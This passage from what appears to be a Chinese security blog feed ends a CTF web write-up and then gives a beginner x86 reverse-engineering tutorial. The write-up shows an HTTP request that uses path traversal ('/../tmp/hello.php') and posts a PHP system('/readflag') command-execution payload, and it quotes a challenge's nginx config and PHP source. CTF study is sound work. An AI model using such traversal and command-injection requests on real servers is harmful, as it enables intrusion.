AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4664</span>.<span class="hljs-number">45</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1054</span>.<span class="hljs-number">29</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-GB;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">Connection</span>: close<br><br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /../tmp/hello.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: yourhost:<span class="hljs-number">54120</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">22</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4664</span>.<span class="hljs-number">45</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1054</span>.<span class="hljs-number">29</span><br><span class="hljs-attribute">Origin</span>: yourhost<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Referer</span>: http://yourhost/tmp/hello.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-GB;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">Connection</span>: close<br><br><span class="hljs-attribute">1</span>=system(&#x27;/readflag&#x27;);<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081809313.png" alt="image-20220108180908218"></p><p>成功getFlag</p><p>其他可利用的参数 install，download</p><h2 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h2><p>别看了，没复现出来</p><p>先看看nginx.conf</p><p>server {<br>    listen       80;<br>    listen  [::]:80;<br>    server_name  localhost;</p><div class="code-wrapper"><pre><code class="hljs">#access_log  /var/log/nginx/host.access.log  main;root   /var/www/html;location /admin &#123;    allow 127.0.0.1;   //admin页面只允许127.0.0.1的请求    deny all;&#125;location / &#123;    index  index.php;    try_files $uri @phpfpm;  //看寻找的$document.uri存不存在 不存在找@phpfpm 这里$document在第二行定义为 /var/www/html&#125;#error_page  404              /404.html;# redirect server error pages to the static page /50x.html#error_page   500 502 503 504  /50x.html;location = /50x.html &#123;    root   /usr/share/nginx/html;&#125;# proxy the PHP scripts to Apache listening on 127.0.0.1:80##location ~ \.php$ &#123;#    proxy_pass   http://127.0.0.1;#&#125;# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000#location @phpfpm &#123;    include        fastcgi_params;    fastcgi_split_path_info ^(.+?\.php)(/.*)$;    fastcgi_pass   php:9000;   //fastcgi服务端口    fastcgi_index  index.php;  //fastcgi默认的主页资源    fastcgi_param  SCRIPT_FILENAME  $document_root/index.php;    fastcgi_param  REQUEST_URI  $uri;   //$uri请求资源给 REQUEST_URI&#125;# deny access to .htaccess files, if Apache&#39;s document root# concurs with nginx&#39;s one##location ~ /\.ht &#123;#    deny  all;#&#125;</code></pre></div><p>index.php 内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;flight/autoload.php&#x27;</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">flight</span>\<span class="hljs-title">Engine</span>;<br><span class="hljs-variable">$app</span> = <span class="hljs-keyword">new</span> Engine();<br><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$password</span> = uniqid(<span class="hljs-string">&quot;asdfsadf&quot;</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;YouWillNerveKnow&quot;</span>;<span class="hljs-comment">// you will never know the password 唯一标识符</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isdanger</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123;  <span class="hljs-comment">//检测危险参数</span><br>    <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$v</span>))&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$v</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>            <span class="hljs-keyword">if</span>(isdanger(<span class="hljs-variable">$k</span>)||isdanger(<span class="hljs-variable">$value</span>))&#123;  <span class="hljs-comment">//如果传入数组 =&gt; </span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$v</span>,<span class="hljs-string">&quot;../&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;  <span class="hljs-comment">//如果存在 ../ =&gt; 危险</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-variable">$app</span>-&gt;before(<span class="hljs-string">&quot;start&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">foreach</span>([<span class="hljs-variable">$_GET</span>,<span class="hljs-variable">$_POST</span>,<span class="hljs-variable">$_COOKIE</span>,<span class="hljs-variable">$_FILES</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)&#123;<br>        <span class="hljs-keyword">if</span>(isdanger(<span class="hljs-variable">$value</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;go away hack&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;);<br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&#x27;/*&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span> = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;head&quot;</span>,[],<span class="hljs-string">&quot;head_content&quot;</span>);<br>    <span class="hljs-keyword">if</span>(stristr(<span class="hljs-variable">$request</span>-&gt;url,<span class="hljs-string">&quot;login&quot;</span>)!==<span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>])&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-variable">$app</span>-&gt;redirect(<span class="hljs-string">&quot;/login&quot;</span>);<br>    &#125;<br><br>    <br>&#125;);<br><br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span> = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;admin&quot;</span>,[<span class="hljs-string">&quot;data&quot;</span>=&gt;<span class="hljs-string">&quot;./&quot;</span>.<span class="hljs-variable">$request</span>-&gt;query-&gt;data],<span class="hljs-string">&quot;body_content&quot;</span>);<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;template&quot;</span>,[]);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&quot;GET /login&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span> = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;login&quot;</span>,[<span class="hljs-string">&quot;fail&quot;</span>=&gt;<span class="hljs-variable">$request</span>-&gt;query-&gt;fail],<span class="hljs-string">&quot;body_content&quot;</span>);<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;template&quot;</span>,[]);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&quot;POST /login&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span>  = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$request</span>-&gt;data-&gt;username === <span class="hljs-variable">$username</span> &amp;&amp; <span class="hljs-variable">$request</span>-&gt;data-&gt;password === <span class="hljs-variable">$password</span>)&#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable">$app</span>-&gt;redirect(<span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-variable">$app</span>-&gt;redirect(<span class="hljs-string">&quot;/login?fail=1&quot;</span>);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&quot;GET /&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;index&quot;</span>,[],<span class="hljs-string">&quot;body_content&quot;</span>);<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;template&quot;</span>,[]);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;start();<br></code></pre></td></tr></table></figure><p>我就直接暴躁，不懂别人怎么做的了，也许是直接给源码了，我这里是啥也没有</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++逆向笔记</title>
    <link href="/2022/01/07/C-%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/01/07/C-%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="信息安全-C-逆向"><a href="#信息安全-C-逆向" class="headerlink" title="信息安全-C++逆向"></a>信息安全-C++逆向</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="存储单位"><a href="#存储单位" class="headerlink" title="存储单位"></a>存储单位</h3><p>​    bit     最小单位 0&#x2F;1</p><p>​    Byte  1Byte&#x3D;8bit</p><p>​    DWORD   1DWORD&#x3D;2Byte</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><h4 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h4><p>​    eax    累加器寄存器，用于进行数学运算。</p><p>​    ebx    基数寄存器</p><p>​    ecx    计数器</p><p>​    edx    数据寄存器</p><p>​    ESI    原地址寄存器</p><p>​    EDI    目的寄存器</p><p>​    EBP    栈底    </p><p>​    ESP    栈顶</p><p>​    EIP    指令寄存器，EIP指向下一个将会被执行的指令。</p><p>寄存器大小都是32位 (四个字节) 。它们可以储存值为从0-FFFFFFFF (无符号)的数据</p><h4 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h4><ol><li>CS -&gt; ‘code segment’(代码段寄存器)：用于存放应用程序代码所在段的段基址(之后会说明)</li><li>DS -&gt; ‘data segment’(数据段寄存器)：用于存放数据段的段基址(以后会说明)</li><li>ES -&gt; ‘extra segment’(附加段寄存器)：用于存放程序使用的附加数据段的基地址</li><li>SS -&gt; ‘stack segment’(栈段寄存器)：用于存放栈段的段基址(以后会说明)</li></ol><h4 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h4><p>ZF、OF、CF</p><p><strong>Z-Flag(零标志)：</strong></p><p>ZF是破解中用得最多的寄存器(通常情况下占了90%)，它可以设成0或者1。若上一个运算结果为0，则其值为1，否则其值为0。(你可能会问为什么‘CMP’可以操作ZF寄存器，这是因为该指令在做比较操作(等于、不等于)，那什么时候结果是0什么时候是1呢？待会再说) </p><p><strong>The O-Flag(溢出标志)：</strong></p><p>OF寄存器在逆向工程中大概占了4%，当上一步操作改变了某寄存器的最高有效位时，OF寄存器会被设置成1。例如：EAX的值为7FFFFFFFF，如果你此时再给EAX加1，OF寄存器就会被设置成1，因为此时EAX寄存器的最高有效位改变了(你可以使用电脑自带计算器将这个16进制转化成2进制看看)。还有当上一步操作产生溢出时(即算术运算超出了有符号数的表示范围)，OF寄存器也会被设置成1。 </p><p><strong>The C-Flag(进位标志)：</strong></p><p>进位寄存器的使用大概占了1%，如果产生了溢出，就会被设置成1。例，假如某寄存器值为FFFFFFFF，再加上1就会产生溢出，你可以用电脑自带的计算器尝试。 </p><h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><p><strong>CALL (调用)</strong></p><p>语法：CALL something</p><p>CALL指令将当前的相对地址(IP)压入栈中，并且调用CALL 后的子程序</p><p>CALL 可以这样使用：</p><figure class="highlight html"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs html">CALL 404000                ;; 最常见: CALL 地址CALL EAX                   ;<br>; CALL 寄存器 - 如果寄存器存的值为404000，那就等同于第一种情况CALL DWORD PTR [EAX]       ;; <br>CALL [EAX]偏移量所指向的地址CALL DWORD PTR [EAX+5]     ;;‘’<br>CALL [EAX+5]偏移量所指向的地址<br></code></pre></td></tr></table></figure><p><strong>CDQ</strong></p><p>语法：CDQ</p><p>CDQ指令第一次出现时通常不好理解。它通常出现在除法前面，作用是将EDX的所有位变成EAX最高位的值，</p><p>比如当EAX&gt;&#x3D;80000000h时，其二进制最高位为1，则EDX被32位全赋值为1，即FFFFFFFF</p><p>若EAX&lt;80000000，则其二进制最高位为0，EDX为00000000。</p><p>然后将EDX：EAX组成新数(64位)：FFFFFFFF 80000000</p><p><strong>DEC (自减)</strong></p><p>语法: DEC something</p><p>dec用来自减1，相当于c中的–</p><p>dec可以有以下使用方式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">dec eax                             ;; eax自减1dec [eax]                           ;; 偏移量为eax的值自减1dec [401000]                        ;; 偏移量为401000的值自减1dec [eax+401000]                    ;; 偏移量为eax+401000的值自减1<br></code></pre></td></tr></table></figure><p>dec指令可以标记ZF、OF</p><p><strong>DIV (除)</strong></p><p>语法: DIV 除数</p><p>DIV指令用来将EAX除以除数(无符号除法)，被除数通常是EAX，结果也储存在EAX中，而被除数对除数取的模存在除数中。</p><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">mov eax,64                      ;<br>; EAX = 64h = 100<br>mov ecx,9                       ;; <br>ECX = 9<br>div ecx                         ;; EAX除以ECX<br></code></pre></td></tr></table></figure><p>在除法之后 EAX &#x3D; 100&#x2F;9 &#x3D; 0B(十进制：11) 并且 ECX &#x3D; 100 MOD 9 &#x3D; 1</p><p>div指令可以标记CF、OF、ZF</p><p><strong>IDIV (整除)</strong></p><p>语法: IDIV 除数</p><p>IDIV执行方式同div一样，不过IDIV是有符号的除法</p><p>idiv指令可以标记CF、OC、ZF</p><p><strong>IMUL (整乘)</strong></p><p>语法：IMUL 数值</p><p>IMUL 目标寄存器、数值、数值</p><p>IMUL 目标寄存器、数值</p><p>IMUL指令可以把让EAX乘上一个数(INUL 数值)或者让两个数值相乘并把乘积放在目标寄存器中(IMUL 目标寄存器, 数值,数值)或者将目标寄存器乘上某数值(IMUL 目标寄存器, 数值)</p><p>如果乘积太大目标寄存器装不下，那OF、CF都会被标记，ZF也会被标记</p><p><strong>JUMPS</strong></p><p>这些都是最重要的跳转指令和触发条件(重要用*标记，最重要用**标记)：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html">指令                条件                    条件<br>JA*          -    如果大于就跳转(无符号)      - CF=0 and ZF=0<br>JAE          -    如果大于或等于就跳转(无符号)- CF=0JB*          -    如果小于就跳转(无符号)   - CF=<br>1JBE          -    如果小于或等于就跳转(无符号)- CF=1 or ZF=1<br>JC           -    如果CF被标记就了跳转       - CF=1JCXZ         -    如果CX等于0就跳转      - CX=0<br>JE**         -    如果相等就跳转        - ZF=1<br>JECXZ        -    如果ECX等于0就跳转       - ECX=0JG*          -    如果大于就跳转(有符号)   - ZF=0 and SF=OF (SF = Sign Flag)<br><br>JL          -    如果小于就跳转(有符号)    - SF != OF (!= is not)<br>JLE         -    如果小于或等于就跳转(有符号 - ZF=1 and OF != OF<br>JMP      -    跳转             - 强制跳转JNA          -    如果不大于就跳转(无符号)   - CF=1 or ZF=1<br>JNAE         -    如果不大于等于就跳转(无符号) - CF=1<br>JNB          -    如果不小于就跳转(无符号)   - CF=0JNBE         -    如果不小于等于就跳转(无符号) - CF=0 and ZF=0JNC          -    如果CF未被标记就跳转     - CF=0JNE**        -    如果不等于就跳转       - ZF=0JNG          -    如果不大于就跳转(有符号)   - ZF=1 or SF!=OF<br>JGE*         -    如果大于或等于就跳转(有符号) - SF=OF<br>JNGE         -    如果不大于等于就跳转(有符号) - SF!=OF<br>JNL          -    如果不小于就跳转(有符号)   - SF=OF<br>JNLE         -    如果不小于等于就跳转(有符号) - ZF=0 and SF=OF<br>JNO          -    如果OF未被标记就跳转     - OF=0<br>JNP          -    如果PF未被标记就跳转     - PF=0<br>JNS          -    如果SF未被标记就跳转      - SF=0<br>JNZ          -    如果不等于0就跳转      - ZF=0JO           -    如果OF被标记就跳转     - OF=1JP           -    如果PF被标记就跳转     - PF=1<br>JPE          -    如果是偶数就跳转       - PF=1JPO          -    如果是奇数就跳转       - PF=0<br>JS           -    如果SF被标记就跳转     - SF=1<br>JZ           -    如果等于0就跳转      - ZF=1<br></code></pre></td></tr></table></figure><p><strong>MUL (乘法)</strong></p><p>语法：MUL 数值</p><p>这个指令同IMUL一样，不过MUL可以乘无符号数。</p><p><strong>REP&#x2F;REPE&#x2F;REPZ&#x2F;REPNE&#x2F;REPNZ</strong></p><p>语法: REP&#x2F;REPE&#x2F;REPZ&#x2F;REPNE&#x2F;REPNZ ins</p><p>重复上面的指令：直到CX&#x3D;0。ins必须是一个操作符，比如CMPS、INS、LODS、MOVS、OUTS、SCAS 或 STOS</p><p><strong>RET (返回)</strong></p><p>语法：RET</p><p>RET digit</p><p>RET指令的功能是从一个代码区域中退出到调用CALL的指令处。</p><p>RET digit在返回前会清理栈</p><p><strong>TEST</strong></p><p>语法：TEST 操作符、操作符</p><p>这个指令99%都是用于”TEST EAX, EAX”，它执行与AND相同的功能，但是并不储存数据。如果EAX&#x3D;0就会标记ZF，如果EAX不是0，就会清空ZF</p><p><strong>XOR</strong></p><p>语法：XOR 目的数,源数</p><p>XOR指令对两个数进行异或操作</p><p>这个指令清空OF、CF，但会标记ZF</p><p>为了更好的理解，思考下面的二进制串：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">1001010110 0101001101<br></code></pre></td></tr></table></figure><p>如果异或它们，结果将是1100011011</p><p>如果两个值相等，则结果为0，否则为1，你可以使用计算器验算。</p><p>很多情况下我们会使用”XOR EAX, EAX”，这个操作是将EAX赋值为0，因为当一个值异或其自身，就过都是0。</p><h2 id="选择结构语句"><a href="#选择结构语句" class="headerlink" title="选择结构语句"></a>选择结构语句</h2><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><h4 id="Only-ifelse"><a href="#Only-ifelse" class="headerlink" title="Only ifelse"></a>Only ifelse</h4><p>特点：</p><p>​    cmp ;条件反写，为了跳过后面的jxx 进而执行代码块内容</p><p>​    if else则都是往增量地址跳转</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nNumber = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%ud&quot;</span>,&amp;nNumber);<br>    <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">0</span>)<br>    &#123;<br>        nNumber = <span class="hljs-number">0</span>;                <span class="hljs-comment">//第一种情况下无分支</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        nNumber = <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> nNumber;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应反汇编结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">main proc near</span><br><span class="hljs-function"></span><br><span class="hljs-function">var_4</span>= dword ptr <span class="hljs-number">-4</span><br>arg_0= dword ptr  <span class="hljs-number">10</span>h<br>arg_8= qword ptr  <span class="hljs-number">18</span>h<br><br>push    rbp<br>mov     rbp, rsp  <span class="hljs-comment">//初始化栈</span><br>sub     rsp, <span class="hljs-number">30</span>h   <span class="hljs-comment">//开辟栈</span><br>mov     [rbp+arg_0], ecx <br>mov     [rbp+arg_8], rdx<br>call    __main<br>mov     [rbp+var_4], <span class="hljs-number">0</span>   <span class="hljs-comment">//[rbp-4] =0 val1=0</span><br>lea     rax, [rbp+var_4]  <br>mov     rdx, rax<br>lea     rcx, Format     ; <span class="hljs-string">&quot;%ud&quot;</span><br>call    <span class="hljs-built_in">scanf</span>  <span class="hljs-comment">//scanf读入数据</span><br>cmp     [rbp+arg_0], <span class="hljs-number">0</span>   <span class="hljs-comment">// argc==0</span><br>jnz     <span class="hljs-keyword">short</span> loc_40158D<br>       <span class="hljs-comment">//分支1</span><br>        mov     [rbp+var_4], <span class="hljs-number">0</span>  <br>jmp     <span class="hljs-keyword">short</span> loc_401594<br>       <span class="hljs-comment">//分支2</span><br>        loc_40158D:<br>mov     [rbp+var_4], <span class="hljs-number">0F</span>FFFFFFFh <span class="hljs-comment">// 代码中体现的是变量值=-1 这里为什么是0FFFFFFFF</span><br>     <br></code></pre></td></tr></table></figure><h4 id="onlyifelse1"><a href="#onlyifelse1" class="headerlink" title="onlyifelse1"></a>onlyifelse1</h4><p>特点：</p><p>​    